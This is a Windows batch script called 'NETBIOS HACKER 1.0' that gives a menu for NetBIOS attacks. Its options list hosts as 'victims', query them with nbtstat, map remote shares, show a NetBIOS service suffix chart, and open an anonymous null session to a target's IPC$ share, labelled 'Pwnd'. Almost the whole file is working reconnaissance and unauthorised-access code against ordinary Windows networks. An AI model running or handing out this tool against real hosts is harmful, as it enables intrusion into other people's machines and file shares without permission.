@echo off
title NETBIOS HACKER 1.0
color 0a
cd\
:menu
cls
echo    ====================
echo      NETBIOS HACKER 1.0
echo    ====================
echo.
echo if its not running properly run the batch file as administrator
echo.
echo    1 - Find Victims
echo    2 - Host Statistics
echo    3 - Net Use
echo    4 - Reference Chart
echo    5 - IPC Share PWNz0R
echo.
choice /c:12345Q>nul
if errorlevel 5 goto ipcpwn
if errorlevel 4 goto table
if errorlevel 3 goto netuse
if errorlevel 2 goto netstat
if errorlevel 1 goto search
echo CHOICE missing
goto done
 
:search
net view
set /p findout=Enter Host to view (without \\) -[)
net view \\%findout%
pause
goto menu
 
:netstat
nbtstat -n
echo.
echo 1st option is host name 2nd is ip address
echo.
set /p name=Enter host name-[)
nbtstat -a %name%
set /p name=Enter host address-[)
nbtstat -A %name%
pause
goto menu
 
:netuse
set /p drive=Enter Drive Letter to use-[)
set /p address=Enter Host IP Address-[)
set /p share=Enter Host Share-[)
net use %drive%: \\%address%\%share%
pause
goto menu
 
:table
 
echo Name            Number        Type        Usage
echo =========================================================================
echo [computername]      00         U        Workstation Service
echo [computername]      01         U        Messenger Service
echo [\\_MSBROWSE_]      01         G        Master Browser
echo [computername]      03         U        Messenger Service
echo [computername]      06         U        RAS Server Service
echo [computername]      1F         U        NetDDE Service
echo [computername]      20         U        File Server Service
echo [computername]      21         U        RAS Client Service
echo [computername]      22         U        Exchange Interchange
echo [computername]      23         U        Exchange Store
echo [computername]      24         U        Exchange Directory
echo [computername]      30         U        Modem Sharing Server Service
echo [computername]      31         U        Modem Sharing Client Service
echo [computername]      43         U        SMS Client Remote Control
echo [computername]      44         U        SMS Admin Remote Control Tool
echo [computername]      45         U        SMS Client Remote Chat
echo [computername]      46         U        SMS Client Remote Transfer
echo [computername]      4C         U        DEC Pathworks TCPIP Service
echo [computername]      52         U        DEC Pathworks TCPIP Service
echo [computername]      87         U        Exchange MTA
echo [computername]      6A         U        Exchange IMC
echo [computername]      BE         U        Network Monitor Agent
echo [computername]      BF         U        Network Monitor Apps
echo [username]          03         U        Messenger Service
echo [domain]            00         G        Domain Name
echo [domain]            1B         U        Domain Master Browser
echo [domain]            1C         G        Domain Controllers
echo [domain]            1D         U         Master Browser
echo [domain]            1E         G        Browser Service Elections
echo [INet~Services]     1C         G        Internet Information Server
echo [IS~Computer_name]  00         U        Internet Information Server
echo [computername]     [2B]        U        Lotus Notes Server
echo IRISMULTICAST      [2F]        G        Lotus Notes
echo IRISNAMESERVER     [33]        G        Lotus Notes
echo Forte_$ND800ZA     [20]        U        DCA Irmalan Gateway Service
echo.
echo Unique (U): The name may have only one IP address assigned to it. On a network echo device, multiple occurences of a single name may appear to be registered, but the echo suffix will be unique, making the entire name unique.
echo.
echo Group (G): A normal group; the single name may exist with many IP addresses.
echo.
echo Multihomed (M): The name is unique, but due to multiple network interfaces on the echo same computer, this configuration is necessary to permit the registration. Maximum echo number of addresses is 25.
echo.
echo Internet Group (I): This is a special configuration of the group name used to manage echo WinNT domain names.
echo.
echo Domain Name (D): New in NT 4.0.
echo.
pause
goto menu
 
:ipcpwn
set /p address=Enter Host Address to be Pwnd-[)
set /p drive=Enter Drive Letter to Link-[)
net use \\%address%\ipc$ "" /user:""
pause
goto menu
 
:done
exit